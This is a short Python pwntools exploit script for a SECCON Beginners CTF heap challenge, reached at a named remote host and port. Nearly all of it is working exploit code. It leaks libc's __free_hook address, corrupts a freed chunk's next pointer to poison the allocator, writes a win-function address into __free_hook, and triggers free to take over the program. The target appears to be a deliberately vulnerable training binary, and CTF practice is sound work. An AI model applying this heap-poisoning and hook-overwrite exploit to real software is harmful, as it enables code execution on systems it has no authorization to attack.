from pwn import *
import sys

#import kmpwn
#sys.path.append('/home/vagrant/kmpwn')
#from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = ""
HOST = "bh.quals.beginners.seccon.jp"
PORT = 9002 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

def readA(data):
	conn.sendlineafter("> ", "1")
	conn.send(data)

def B(data):
	conn.sendlineafter("> ", "2")
	conn.send(data)

def delete():
	conn.sendlineafter("> ", "3")

def exploit():
	conn.recvuntil("hook>: ")
	libc_free_hook = int(conn.recvline(),16)
	conn.recvuntil("win>: ")
	addr_win = int(conn.recvline(),16)
	print hex(addr_win)
	print hex(libc_free_hook)
	B("pokemon")
	delete()
	payload = "A"*0x18
	payload += p64(0x31)
	payload += p64(libc_free_hook)
	
	readA(payload)
	B("pokemon")
	delete()
	
	B(p64(addr_win))
	delete()
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
